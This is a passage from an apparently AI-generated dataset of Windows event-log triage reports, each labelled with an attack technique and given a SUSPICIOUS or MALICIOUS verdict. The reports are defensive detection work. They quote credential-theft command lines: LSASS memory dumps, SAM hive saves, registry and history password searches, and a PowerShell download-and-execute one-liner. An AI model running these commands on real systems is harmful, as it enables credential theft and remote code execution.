- Conduct a detailed review of user activities related to the `admin_test` account to ascertain whether these commands and scripts were executed during routine maintenance or by legitimate users.
- Cross-examine with other threat intelligence sources or signature-based detections to ensure similar patterns haven't been observed in known compromises.
- If these actions were indeed unauthorized, consider conducting a deeper forensic investigation to understand the scope and potential impact of the suspicious activities. 

Engaging in these efforts will bolster confidence in classifying these findings as benign or confirm if more serious actions are required."
dump volume shadow copy hives with System.IO.File,"### Analysis:

Upon reviewing the provided Windows event logs, several activities stand out and require further examination. Let's break down potential red flags:

#### 1. **PowerShell Activity:**
- The PowerShell events indicate a script attempting to copy the SAM registry hive from Volume Shadow Copies to temporary locations using a loop (`1..10`). This action is highly suspicious as it targets sensitive parts of the operating system related to user authentication.
- **Indicator of Malicious Activity:** Attempts to access and copy the SAM file, especially from shadow copies, is typically behavior associated with post-exploitation activities or preparatory steps for a pass-the-hash attack.

#### 2. **Time Change Events:**
- There are events indicating time changes on the system, a common tactic used by attackers to manipulate time-sensitive logs and potentially evade detection based on time sequences.
- **Indicator of Suspicious Activity:** While legitimate software or system updates might trigger time change events, in conjunction with other suspicious activities, this could indicate an attempt to hide traces.

#### 3. **Sysmon Logs:**
- Sysmon logs show multiple instances of `wevtutil.exe`, `conhost.exe`, and potential PowerShell activity. The frequent execution of event utility (`wevtutil.exe`) might suggest log clearing attempts or manipulation.
- **Process Executions:** Considering the presence of `whoami` and `hostname` commands executed under a potentially compromised user context (SERVER002\admin_test), these are often used by attackers to gather environment and user context information.

#### 4. **Noteworthy Security Log Events:**
- The privilege escalation attempt is evident from event 4672, showing a user (`admin_test`) being granted high-level administrative privileges.
- **Indicators of Possible Compromise:** Unauthorized privilege gains and sensitive file access are pivotal signs of potential intrusion and malicious activity.

### Assessment:

Based on the evidence observed within the Windows event logs, the activity is consistent with common post-compromise tactics seen in real-world attacks. The combination of PowerShell script activity targeting critical files, possible time manipulation, unauthorized privilege escalation, and attempts to query sensitive system information strongly indicate potentially harmful activity on the host.

### Resolution:

**MALICIOUS** - The logs contain definitive signs of malicious activities. Immediate action is necessary, such as isolating the affected system, conducting a comprehensive forensic investigation, and reviewing and strengthening security measures across the network to prevent further compromise.

### Recommendations:

- **Isolate Server002:** Immediately disconnect it from the network to prevent data exfiltration or further propagation.
- **Initiate Incident Response:** Engage in incident response protocols to assess the extent of the compromise.
- **Perform Forensic Analysis:** Investigate other systems for indicators of compromise, check for unusual outbound connections, and conduct memory and disk analysis.
- **Enhance Security Monitoring:** Ensure comprehensive logging is enabled across all devices, especially for events like Process Creation, File/Folder Access, and PowerShell script executions.
- **Review Access Controls:** Audit user permissions and consider implementing more stringent privilege management practices.
- **Patch and Update Systems:** Ensure all systems are patched and up-to-date to mitigate known vulnerabilities exploited through techniques observed.

"
Dump LSASS.exe using lolbin rdrleakdiag.exe,"After analyzing the provided logs, here is a detailed analysis of the events and activities recorded:

1. **PowerShell Activity:**
   - Across multiple PowerShell logs, there's evidence of a PowerShell script execution that attempts to create a full memory dump of LSASS (Local Security Authority Subsystem Service) process using `rdrleakdiag.exe`. This action is highly suspicious because extracting a memory dump of LSASS is a common technique used by attackers to extract credentials and perform offline analysis for credential theft.
   - The script checks paths in both `System32` and `SysWOW64` directories for the presence of `rdrleakdiag.exe`, creates a directory in the `TEMP` folder, and then runs the binary with the `/fullmemdmp` option on the LSASS process ID. The script clearly outputs the location of the minidump file created.
   
2. **Security Logs:**
   - There are multiple events showing special privileges assigned to user `admin_test`. The privilege `SeDebugPrivilege` is notably concerning as it allows for privileged operations like attaching a debugger to any process, which in conjunction with LSASS dumping activities, may facilitate an attack using elevated privileges.
   - The logon events indicate that user `admin_test` accessed the system over the network (Logon Type 3) using NTLM authentication, which itself isn't unusual but deserves attention in context with the other activities.

3. **Sysmon Logs:**
   - There are several executions of Windows system utilities (`wevtutil.exe` and `conhost.exe`) associated with the `admin_test` user. While these utilities are not inherently malicious, their execution alongside suspicious PowerShell activities suggests they might be part of an ad-hoc or scripted operation.
   - The presence of `whoami.exe` suggests checking of the active user's identity post-commands, which may be indicative of the attacker ensuring they were executing actions with the expected privileges.
   - Most notably, a PowerShell process is recorded executing the script discussed above, directly confirming the suspicious activity detailed in the PowerShell logs.

**Assessment:**
- **Malicious Activity Identified:** The activity involving memory dumping of the LSASS process along with the use of certain privileges aligns with tactics observed in credential theft attempts. The presence of activities such as testing for executable paths, directory creation, and command execution related to LSASS suggest a compromise or at the very least, malicious intent.

**Recommendation:**
- **Immediate Actions:** Isolate the affected host/server from the network to prevent any potential spread or data exfiltration.
- **Forensics and Remediation:** Conduct a full forensic investigation to identify further indicators of compromise, determine if credentials have been stolen, and identify how initial access was achieved. Remediate by cleaning the system, resetting passwords potentially compromised, and reviewing/strengthening the security posture.

**Resolution: MALICIOUS**"
Enumeration for Credentials in Registry,"In analyzing the provided Windows event logs, there are specific areas that stand out and merit further scrutiny:

1. **Command Line Execution**: The Sysmon log contains an event where `cmd.exe` is used to execute registry queries explicitly searching for passwords: 
   ```
   CommandLine: ""cmd.exe"" /c reg query HKLM /f password /t REG_SZ /s & reg query HKCU /f password /t REG_SZ /s
   ```
   The use of command-line to query the registry for sensitive information like passwords is clearly suspicious and often indicates potential malicious intent or compromise.
   
2. **Process Execution Patterns**: There are several entries for processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` executed by the user `SERVER002\\admin_test`. While some of these utilities are part of normal system administration activities, when seen together, especially with `cmd.exe` searching registry keys for passwords, they may suggest an orchestrated attempt to discover or exploit system vulnerabilities.

3. **Unusual Logon Types and Privilege Assignments**:
   - Logon events (Event ID 4624) show SYSTEM or high-integrity level logins, which are common for SYSTEM processes, but also demonstrate extensive privileges as observed in Event ID 4672. Given the context, these could be misused if SYSTEM integrity is compromised.
   - Event IDs 4798 and 5379 occurring in rapid succession may indicate attempts at enumerating user accounts or accessing stored credentials, which again could suggest reconnaissance activities.

4. **Security Logs**: The presence of security logs indicating events such as attempted access to a ""MicrosoftAccount"" and the repeated access failures (ReturnCode 3221226021) may not be inherently malicious but interpretable as part of a larger sequence of unauthorized access attempts.

5. **Additional Events and Processes**:
   - Several instances where processes related to Microsoft Edge updates are launching and executing are observed, which generally align with normal operations and updates for Microsoft Edge.
   - Multiple events involving `svchost.exe`, `taskhostw.exe`, and similar service management executables are also noted performing regular activities, but without more data, it does not link directly to suspicious activities.

### Conclusion

Based on the analysis:

- **Resolution: SUSPICIOUS**
  
The activities logged, specifically around the command-line registry query for passwords and the enumeration of user accounts, appear to indicate potential suspicious behavior. The incidents require further investigation, especially focusing on understanding the context and purpose behind these operations. Given the lack of additional context or corroborating evidence directly indicating overt malicious activity, it can't be definitively labeled as malicious.

### Guidance

1. **Immediate Steps**: 
   - Investigate the `SERVER002\\admin_test` user activity in detail, especially focusing on their commands and accessed resources.
   - Alert security teams to monitor systems for related events or activities aligned with the observed behavior to prevent possible compromise.
  
2. **Medium-Term Actions**:
   - Conduct a comprehensive security audit focused on privilege assignments and access controls for sensitive system components, particularly for accounts with administrative privileges.
   - Enforce logging and monitoring enhancements, enabling more detailed audit trails for actions carried out through high-privilege accounts.

3. **Long-Term Strategy**:
   - Educate system administrators and users on security practices, specifically highlights on identifying potentially malicious activities.
   - Consider advanced threat detection or behavior analytics tools to provide proactive monitoring and alerting of similar occurrences in the future."
Dump LSASS with createdump.exe from .Net v5,"## Analysis of Logs

### Overview
In reviewing the provided logs, the entries mainly consist of events captured by the Sysmon and Windows PowerShell log channels from a Windows host named `Server002`. Analysis focuses on identifying any suspicious or anomalous behaviors that could suggest malicious activities.

### Suspicious Behavior Identified

1. **PowerShell Execution with Suspicious Command**:
   - The logs show the execution of PowerShell scripts that involve potentially sensitive operations, such as accessing `lsass` (Local Security Authority Subsystem Service), which is critical because `lsass` is a target for credential dumping attacks.
   - The command seen in the logs is:
     ```
     powershell.exe & { $exePath = resolve-path ""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\script.exe"" & ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id }
     ```
   - This script seems to be attempting to create a dump of the `lsass` process, typically a sign of an attempt to extract credentials from memory.

2. **Frequent Use of Command-line Host (conhost.exe) and Utilities**:
   - The logs show frequent invocation of utilities like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `conhost.exe`, all under the user `SERVER002\admin_test`. While these are standard utilities, their usage in a short span, especially following PowerShell executions mentioned above, may be indicative of reconnaissance or further script-based operations which are often seen in lateral movement within systems.

### Assessment

- **Suspicious**: The pattern of PowerShell usage to potentially dump credentials and frequent invocation of command-line utilities in rapid succession is suspicious. The PowerShell script specifically trying to target `lsass` aligns with credential harvesting tactics used in many attacks. However, from the information provided, there is not enough evidence to confirm a breach or determine the actual context of the operation (such as a legitimate security scan or test from an admin).

### Threats and Risks Identified

- **Credential Harvesting**: Given that `lsass` dumps are often used to retrieve credentials, this behavior poses a significant risk if it was executed without authorization.
- **Potential Reconnaissance Activity**: The use of utilities like `wevtutil` and `whoami`, although legitimate, following suspicious PowerShell activity, might suggest attempts to gather system information or event logs.

### Guidance for Further Actions

1. **Immediate Investigation**:
   - Confirm the legitimacy of the activities: Reach out to `SERVER002\admin_test` to verify if the actions were legitimate tasks performed by the user, such as a sanctioned security assessment.
   - Review system for other indicators of compromise (IOCs) such as unusual network connections, new user accounts, unauthorized tasks, or service modifications.

2. **Monitor and Isolate**:
   - Start monitoring the system for similar PowerShell activities and high-integrity alerts.
   - If deemed necessary, consider isolating the host from the network to prevent potential lateral movement or exfiltration of credentials.

3. **Hardening and Audit**:
   - Ensure that endpoint protection and Windows logging configurations are appropriately configured to capture such events in detail.
   - Conduct a thorough audit of user permissions and recent administrative activities.

### Conclusion
Based on the logs, the resolution is **SUSPICIOUS**. The identified activities warrant further investigation to validate their legitimacy. If unauthorized, they suggest a potential compromise that could harm the organization's security posture."
PetitPotam,"Upon analyzing the provided log entries, I have identified potential signs of suspicious activity, primarily related to the execution of PowerShell scripts from a temporary directory. Here is a breakdown of the notable activities observed:

1. **Unusual PowerShell Execution**: 
   - Multiple Sysmon events show the execution of `powershell.exe` from the path `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`. The command line includes a script executed from the temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe` that connects to IPs `10.0.0.3` and `10.0.0.2`. This can indicate a script executing potentially malicious actions. [EventID: 17997]
   
2. **PowerShell Log Entries**: 
   - Windows PowerShell logs reveal entries showing the same PowerShell command execution as mentioned in the Sysmon logs. The execution involved starts/stops of several providers and creates a potential launch point for ongoing operations. Events from this log indicate a script being executed which is unconventional and demands deeper inspection. [EventID: 1073-1074]

3. **Windows Event Logs**:
   - The repeated execution and referencing of executable processes, such as `svchost.exe` and `conhost.exe`, is common but should still be noted when associated as child processes of unconventional PowerShell executions. These could be used as a method to hide malicious activities in certain attack scenarios.
   
4. **Microsoft Edge Update Logs**:
   - There is a significant number of logs referencing Microsoft Edge Update activities, which are interleaved with other processes. These likely indicate regular update and maintenance routines and appear to involve system-level operations with the user `NT AUTHORITY\\SYSTEM`, which appears normal for these processes.

**Diagnosis**:
- **SUSPICIOUS**: The execution of PowerShell scripts from a temporary directory leveraging IP addresses within the command line is suspicious. It typically represents a potential attempt to execute malicious scripts, retrieve payloads from a network, or exfiltrate data. Although I cannot confirm conclusively that the activity is malicious without further context (specifics on `script.exe` contents), it does warrant a thorough investigation.

**Recommendations**:
1. **Immediate Investigation**: Conduct a detailed forensic analysis on `script.exe` found in the temporary directory and the logs associated with the PowerShell process, focusing on its origin, actions, and the data it manages.
2. **Network Traffic Analysis**: Analyze network traffic logs around the IPs `10.0.0.3` and `10.0.0.2` at the time of the script execution to verify any unauthorized data transmission or command/control signals between these addresses.
3. **Further Logging**: Enable more stringent logging and monitoring on PowerShell activities and examine whether similar execution patterns occur in other systems within the network.
4. **Security Best Practices**: Update security protocols related to script execution in temporary directories, ensuring thorough review and restriction where applicable.

Pending further investigation, consider isolating the host to prevent potential spread if the script is adversarial."
"Registry dump of SAM, creds, and secrets","Upon analyzing the provided Windows event logs, several aspects indicate potentially suspicious activity. Below is the detailed analysis of the logs:

1. **Security Log - Event ID 4672 (Special privileges assigned to new logon):**
   - This event shows a list of high privileges assigned to the SYSTEM user, such as `SeDebugPrivilege`, `SeSecurityPrivilege`, and `SeTakeOwnershipPrivilege`. While SYSTEM inherently has these privileges, it can be suspicious if these are assigned in a broader context, especially if there are subsequent unusual activities.
  
2. **Sysmon Log - Process Executions:**
   - **TrustedInstaller.exe** and **TiWorker.exe**: Executed under SYSTEM. These are legitimate Windows processes related to the module installer.
   - **whoami.exe**: Executed by the user `admin_test`, which is often used to determine the current user context. The presence of multiple executions of this command can be benign but warrants attention due to unusual patterns.
   - **cmd.exe** followed by **reg.exe**: There is a command-line invocation with `cmd.exe` that saves the SAM, SYSTEM, and SECURITY registry hives to a temporary directory. This is highly suspicious and indicative of an attempt to extract sensitive registry information, commonly associated with malicious intent such as credential extraction or system compromise.

3. **Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` are executed. This tool is used for managing Windows event logs and may be used to clear or tamper logs to cover tracks. Its repetitive execution alongside sensitive registry hive dumping is suspect.

4. **Command-Line Patterns:**
   - String patterns found in `cmd.exe` using `reg save` to dump critical registry hives without any authorized administrative task visibility could indicate malicious behavior typical for credential dumping techniques.

**Assessment:**
Based on the analysis of these logs, the activities executed by `admin_test` involving `cmd.exe` to save sensitive registry hives and actions related to `wevtutil.exe` highlight potential malicious behavior. The execution of commands that could lead to credential extraction is a major concern.

**Resolution:** MALICIOUS

**Guidance:**
1. Immediately isolate the affected host (Server002) to prevent further compromise.
2. Investigate `admin_test` account activities and permissions to understand the extent of potential unauthorized access.
3. Review and monitor other systems for similar activity patterns.
4. Respond to potential credential exposure by enforcing credential resets and monitoring for unauthorized access attempts.
5. Analyze network traffic from Server002 around the time of the activities for any exfiltration attempts.
6. Ensure logs are being archived and protected against tampering to facilitate post-incident analysis.

It’s crucial to follow incident response procedures to mitigate the identified compromise and prevent further security threats."
GPP Passwords (findstr),"Upon reviewing the provided Windows event logs, the following observations were made:

1. **Security Logs:**
   - The security logs show Event ID 4616, which indicates a change in the system time. This action was performed by the ""LOCAL SERVICE"" user via the ""svchost.exe"" process. The change in system time could be explained by normal system synchronization with external time servers. There are no indications that this activity is malicious.

2. **Application Logs:**
   - The application logs consist of messages about the ""edgeupdate"" service stopping. The absence of error messages or failed service reports suggests this activity may be part of routine service behavior or updates and does not normally indicate malicious behavior.

3. **Sysmon Logs:**
   - Multiple processes by ""SERVER002\admin_test"" and ""NT AUTHORITY\SYSTEM"" are executed involving svchost.exe, Powershell, wevtutil.exe (Windows Event Log Utility), conhost.exe, and Edge Update executables.
   - Notable is an execution sequence involving the `cmd.exe` with a specific command line searching for ""cpassword"" in SYSVOL directories. This command can be an indicator of someone attempting to retrieve credentials stored in Group Policy Preferences, which is potentially malicious if performed by unauthorized users. Command sequences like `findstr` being executed with specific keywords related to credentials are suspicious and consistent with known attack behaviors.
   - We see numerous occurrences of `MicrosoftEdgeUpdate.exe`, which is expected for software updating tasks. The nature of launching from `C:\Program Files (x86)\Microsoft\Temp\` might be noteworthy for temporary executions, although this still might align with legitimate software behavior.
   - The `whoami.exe` and `hostname.exe` processes run with legitimate parameters but these process executions right before or after key commands could serve attackers to confirm their access level/environment.

4. **System Logs:**
   - The system logs also indicate changes in system time, consistent with synchronization events recorded in the Security Logs. The events from ""svchost.exe"" are identical to those seen in Security logs, and also seem related to a system time adjustment.

### Assessment:

- **Potential Threat:** The command to search for ""cpassword"" could be a red flag indicating an investigation for sensitive information to attempt privilege escalation. This action is questionable and suggests potentially unauthorized or malicious exploration of the Active Directory environment.

### Resolution:

Given the analysis, I recommend classifying the situation as **SUSPICIOUS**. Further investigation should be undertaken to ensure there hasn't been unauthorized access or reconnaissance activity by reviewing access permissions, considering any unusual system time changes, and any unauthorized usage of administrative tools. A detailed audit of user activities around the time this event took place and checking for signs of privilege escalation or lateral movement is imperative."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"**Detailed Analysis of the Logs:**

**System Log:**
- The logs primarily indicate time synchronization activities by ""svchost.exe."" Time changes and synchronization are normal behaviors, typically associated with the Windows Time Service. There is no apparent indication of malicious activity in these logs.

**Windows PowerShell Log:**
- The logs contain evidence of potentially malicious activity:
  - Execution of PowerShell with `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')`. This command line indicates that a script is being remotely fetched and executed via PowerShell. Such behavior is often associated with script-based attacks or unauthorized remote command execution.

**Security Log:**
- The Security logs focus on time changes verified by ""svchost.exe,"" consistent with the Windows Time Service operations. These logs do not show malicious indicators but support the benign time synchronization observed in the System logs.

**Sysmon Log:**
- The presence of processes like ""whoami.exe,"" ""conhost.exe,"" and ""wevtutil.exe"" are seen. While their presence alone doesn't suggest malicious activity, the execution of a PowerShell script from the Temp directory (as noted in a later Sysmon event related to ""powershell.exe"") is suspicious.
- More concerning is the execution of ""WindowsPowerShell"" with behavior similar to the PowerShell log, indicating it possibly fetched and executed the same remote script. 

**Application Log:**
- The entries concerning Windows Defender remaining active and various Microsoft EdgeUpdate activities (mostly normal) do not seem immediately suspicious. The Edge activities appear to be associated with updating processes.

**Assessment and Conclusion:**
The key finding here is the use of PowerShell to download and execute a script from a remote location. Such actions are highly suspicious and often characteristic of malicious scripting activities—possibly part of a cyber attack or a compromised system attempting to communicate with a command-and-control server or perform other harmful activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately quarantine the affected systems, preventing further script execution or network communication.
- Investigate the downloaded script's contents from the URL, if accessible, in a safe, isolated environment to understand the full impact.
- Conduct a full malware scan and forensic analysis on the impacted system(s).
- Review firewall and proxy logs for additional insights into communications with suspicious endpoints.
- Consider resetting potentially compromised credentials and reinforcing security protocols, such as disabling PowerShell script execution for unauthorized users.
- Analyze broader network traffic to identify any lateral movement or additional compromises.
- Prepare for possible communication with relevant stakeholders, such as incident response teams and data privacy officers, if personal data might be at risk."
WinPwn - passhunt,"Upon analysis of the provided Windows event logs, the following assessments can be made:

### Suspicious Findings:

1. **Automation Script Execution via PowerShell**:
   - The logs indicate the execution of a PowerShell script hosted on GitHub, with the URL `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
   - The command involves downloading and executing the script with `iex(new-object net.webclient).downloadstring`.
   - This is a common method used by attackers to execute malicious scripts from remote locations. The specific script or repository should be investigated for legitimacy and purpose.

2. **Use of Administrative Tools by an Admin Account**:
   - Multiple Sysmon logs show the execution of binaries such as `whoami.exe`, `wevtutil.exe`, and `conhost.exe` by the user `SERVER002\\admin_test`.
   - While not inherently malicious, the context of these tools being executed without clear reasoning could point to suspicious activity, especially if done in close succession or without a traditional admin task process.

3. **Privilege Assignment**:
   - The Security log entries show the `admin_test` account logging in with privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are powerful and could be leveraged maliciously if the account usage is not typically associated with such activities.

### Benign Observations:
- **Time Synchronization Events**: 
   - Entries related to time service and interval adjustments (ntp.m|0x9|) appear normal as part of system operations to keep time accurate and synched with network time servers.
  
- **Regular System and Security Activities**:
  - Normal system service operations such as Windows Defender state reports or standard software execution paths from trusted directories are seen, which do not indicate overt suspicious behavior.

### Overall Assessment:
The logs present a mix of regular system activity and potentially suspicious activity, primarily around the PowerShell usage combined with the remote script hosting. Given the potentially harmful implications of running unknown scripts from the internet, along with elevated privileges used by an admin account, it is critical to further investigate the intention and content of the downloaded script and the context around the admin activities.

### Resolution: 
**SUSPICIOUS** - The activities identified suggest potentially suspicious actions requiring further investigation, particularly focusing on the PowerShell script's source, the actions of the `admin_test` user, and any changes or impacts resulting from these executions on the system.

### Guidance on How to Proceed:
1. **Investigate Script Origin**: Analyze the script's source code and verify its legitimacy and purpose. Ensure it aligns with any known administrative or scheduled tasks.
2. **Audit Admin Account Usage**: Review the actions taken by the `admin_test` account during the time frame of these logs. Assess for any anomalies or activities that do not fit expected behavior.
3. **Network Traffic Analysis**: Examine network logs for unusual outbound connections that may correlate with suspicious PowerShell activity.
4. **System Integrity Check**: Ensure all system files, particularly those related to the observed activities, are unaltered and verified against known good baselines."
Search for Passwords in Powershell History,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made regarding potentially suspicious or anomalous behavior:

### Security Log Observations:
1. **Event ID 4616**: Represents system time being changed by the service ""LOCAL SERVICE"" through the `svchost.exe` process. The timestamps in EventRecordID 30349 and 30350 suggest an adjustment in system time. While time changes can be legitimate (e.g., due to daylight saving adjustments), they may also be leveraged by attackers to manipulate log timestamps. Further checks on this activity should be conducted in conjunction with other correlating events, if any.

### System Log Observations:
1. **Event ID 24 and 1** in Microsoft-Windows-Kernel-General: Corresponding to system time change activities which correlate with the Security log’s Event ID 4616 entries. These time changes occurred in close proximity, indicating synchronization.

### Sysmon Log Observations:
1. **PowerShell Execution**: Event ID 1 shows that `powershell.exe` runs a command searching for strings like “password” and “key” within `ConsoleHost_history.txt`. This command is a potential indicator of credential harvesting behavior, often associated with malicious activity or lateral movement attempts within compromised systems.

2. **Wevtutil.exe Execution**: Multiple instances of `wevtutil.exe` (a legitimate Windows utility for managing event logs) are shown. If auditing has been set up to monitor this utility and it appears unexpectedly or with suspicious frequency/focus, further investigation might be warranted, as it could potentially signify an evasion attempt, such as clearing or modifying logs.

3. **EdgeUpdate Activities**: These logs indicate updates and installations related to Microsoft Edge. Though not inherently suspicious, it is important to verify the legitimacy of these activities. Be cautious for potential misuse of legitimate update processes by malware.

### Windows PowerShell Log Observations:
- The same PowerShell command from Sysmon logs appears, indicating it's executed under the ConsoleHost. The command is intended to extract potentially sensitive information, which is concerning.

### Overall Assessment:
- The initiation of a PowerShell command to search for sensitive keywords in history suggests potentially **SUSPICIOUS** behavior. PowerShell is often used in file, command, or log reconnaissance activities by attackers.
- The system time change adjustment might warrant further context to confirm its necessity or legitimacy. System logs commonly contain benign system activities, but their context relative to suspicious PowerShell execution should be evaluated.

### Resolution:
Given the presence of potentially sensitive keyword searching using PowerShell and its implications on system security, the logs are assessed as **SUSPICIOUS**. Further investigation is recommended to:
- Verify the intention behind the PowerShell command and whether this activity was authorized.
- Investigate the context and necessity of system time adjustments.
- Cross-reference the user activity, `admin_test`, particularly if this is unusual behavior for the user or system.

Further steps should include interviewing relevant personnel for clarification, reviewing system policy changes around the time of logs, and possibly conducting a more in-depth forensic analysis of the system state and network activity."
Azure - Dump All Azure Key Vaults with Microburst,"Upon reviewing the provided log entries from the Windows event logs, some activities suggest indicators of suspicious behavior that warrant further investigation. Here is a detailed analysis:

1. **Security Log:**
   - The events with `EventID 4672` show that a user, `admin_test`, is being granted special privileges (such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`) often associated with administrative activities. While this activity is not inherently malicious, the context and frequency warrant scrutiny.
   - The `LogonType 3` indicates a network logon, which is standard for remote access but requires verification against legitimate user activity patterns.

2. **Sysmon Log:**
   - Execution of `powershell.exe` with a complex command line involving `Get-AzurePasswords.ps1` suggests an attempt to access Azure credentials (`$Password = ConvertTo-SecureString -String ""dataAz"" -AsPlainText -Force`). This indicates a possible attempt to exfiltrate sensitive information or escalate privileges.
   - Frequent use of `wevtutil.exe`, possibly to manage or clear event logs, can be indicative of attempts to cover tracks after malicious activities.
   - The execution of `whoami.exe` and `hostname.exe` can be used for reconnaissance purposes, to determine the current user and machine information, often used by attackers post-intrusion.

3. **Windows PowerShell Log:**
   - The execution of PowerShell scripts and activities related to importing modules and executing scripts like `Get-AzurePasswords.ps1` further supports concerns regarding data access and potential exfiltration.
   - The presence of `Add-Type` used to execute C# code dynamically in the PowerShell script can be indicative of suspicious behavior, as it's often used to run complex operations within PowerShell, potentially bypassing normal script restrictions.

4. **Context and Timestamps:**
   - The rapid succession of events and processes within the same short time frames can suggest automated or script-driven tasks, which in some contexts could denote automated attacks or scripts.
   - Consistent events back-to-back hint at automated processes or attacks that require deeper inspection.

**Assessment:**
- Based on the logs, the activity is best described as **SUSPICIOUS**. The usage of PowerShell scripts which appear to retrieve Azure passwords and manipulate log records, combined with the extensive privileges granted and network-based logons, suggests potentially unauthorized activities but not definitively malicious without further contextual evidence.

**Guidance and Next Steps:**
1. **Isolation and Monitoring:** Isolate the involved host `Server002` and monitor further network activity for any anomalies or sensitive data transfers.
2. **Access Verification:** Verify with the user `admin_test` regarding recent activities and matches against legitimate administrative actions.
3. **Log Analysis:** Inspect additional logs for corroborating evidence, ensure integrity of the event logs, and recover any missing entries.
4. **Credential Security:** Assess the security of Azure credentials and review roles/permissions to ensure no unauthorized access was granted.
5. **Immediate Actions:** Disable the execution of script files from untrusted sources and enforce stricter security policies on PowerShell execution.
6. **Threat Hunting:** Conduct a thorough threat hunt across the environment for similar indicators or artifacts suggestive of intrusion activities.

This incident requires further investigation to rule out or confirm malicious intent."
Simulating access to Windows Firefox Login Data,"After reviewing the provided Windows logs, I have identified several points that may indicate suspicious or potentially malicious behavior that needs to be investigated further:

1. **PowerShell Activity**:
   - Multiple PowerShell events show the execution of a command with the following command line:
     ```
     powershell.exe & {Copy-Item ""$env:APPDATA\\Mozilla\\Firefox\\Profiles\\"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles"" -Force -Recurse}
     ```
   - Copying files from the Firefox profiles directory to a temporary location may be indicative of data exfiltration or preparation for further unauthorized access or analysis. This is suspicious behavior that warrants further investigation.

2. **Sysmon Logs**:
   - The Sysmon events indicate the creation of multiple processes involving standard utilities (e.g., `hostname`, `whoami`) and the PowerShell command mentioned above. The presence of these utilities could be suspicious if not part of normal operation especially when combined with the PowerShell command that copies user profile data.
   - The use of `wevtutil.exe`, which is typically used to manage event logs, may indicate log cleansing or manipulation attempts, especially since they occur in the context of the identified suspicious activity.
   - Notably, the processes initiated by `admin_test` are running with a high integrity level, indicating they have significant permissions on the system.

3. **Security Logs**:
   - Event ID 4624 indicates a successful logon using SYSTEM account (LogonType 5), which is normal for service logons but may be of interest in correlation with the other activities.
   - Event ID 4672 indicates that the SYSTEM account had special privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, amongst others. These privileges allow significant control over the system and manipulation of processes. While this alone doesn't imply malicious behavior, it adds context to potential risks.

**Conclusion**:
The behavior observed in these logs is consistent with potentially unauthorized access or preparatory steps for data exfiltration or system compromise. The combination of PowerShell activity with file copying, use of system utilities under high privileges, and the presence of key services/utilities does not align with typical legitimate operations without further context or authorization.

**Resolution**: SUSPICIOUS - The activities recorded in the logs appear abnormal and potentially malicious. Further investigation is warranted. It is recommended to:
- Investigate the source and intent of the PowerShell command copying user profile data.
- Review policies and logs for any similar past activities.
- Ensure that antivirus or endpoint protection software is correctly configured and up to date.
- Potentially perform a comprehensive system audit or forensic investigation to determine the full scope and any potential breaches.

If these actions are confirmed to be unauthorized or unwanted, appropriate incident response measures should be taken."
Azure - Dump Azure Instance Metadata from Virtual Machines,"Upon reviewing the collection of log entries, several key observations can be made:

### Security Logs:
1. **Event ID 4616**:
   - Indicates a change in system time. Changes to the system time can sometimes be a tactic employed by attackers to manipulate timestamps for evading detection or logging. However, in this context, it seems to coincide with a system task or automated adjustment, and there is no evidence linking this to malicious activity in isolation.

### System Logs:
1. **Microsoft-Windows-Time-Service (Event ID 35)**:
   - Shows synchronization with time.windows.com, which is a standard and expected behavior for Windows hosts to maintain accurate time synchronization.

2. **Kernel-General Events (Event ID 1 and 24)**:
   - Reflect time changes and kernel events that align with typical system operations or time adjustments. These alone are not indicative of malicious activity.

### Windows PowerShell Logs:
1. **PowerShell Script Execution (Event ID 600)**:
   - There are events showing the execution of a PowerShell script using `Invoke-RestMethod` to query metadata from what appears to be a cloud environment (such as Azure, indicated by the IP `169.254.169.254`). The output is then being redirected to a temp file `data.005Test2.txt`.
   - This behavior is uncharacteristic unless it’s part of a known legitimate automation process in a cloud environment. It could be considered a suspicious indicator, especially if this activity wasn’t authorized or expected.

### Sysmon Logs:
1. **Execution of Known Windows Utilities** (Event ID 1):
   - Includes executions of `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. While these are standard utilities, the repeated execution of `whoami.exe` and creation of temporary files can sometimes indicate reconnaissance by an unauthorized actor.
   - Another concerning point is the `PowerShell` command observed, which aligns with the aforementioned activity in the PowerShell logs.

### Application Logs:
1. **Microsoft-Windows-Security-SPP**:
   - No explicit indication of malicious activity; the log appears related to the standard operation of the Software Protection Platform.

### Assessment and Resolution:
Based on the analysis, the PowerShell activity is the most concerning component, especially the use of `Invoke-RestMethod` in a way that could suggest an attempt to gather cloud-specific metadata. The origin and intent of this activity should be verified as authorized to rule out any unauthorized cloud reconnaissance or data theft attempts.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Verify PowerShell Execution**: 
   - Confirm whether the PowerShell behavior is part of an authorized and documented process or script. If not, investigate the account and contextual use surrounding this command.

2. **Audit Account Usage**:
   - Review access logs and potential anomalies related to the user account `SERVER002\\admin_test` to determine if there is unauthorized access or anomaly in login patterns.

3. **File Analysis**:
   - Check the contents and creation of the file `data.005Test2.txt` in the temp directory to understand what data may have been collected and if it contains sensitive information.
   
4. **Network Monitoring**:
   - Consider enhancing network monitoring to capture NTP and HTTP activities to verify no command and control traffic or unauthorized data exfiltration.

5. **Further Investigation**:
   - Depending on findings, consider engaging with the incident response team to assess wider network or system impacts."
Access unattend.xml,"### Detailed Analysis

Upon reviewing the provided log entries, there are several points to address that potentially indicate suspicious or anomalous behavior:

1. **Multiple EdgeUpdate Executions:**
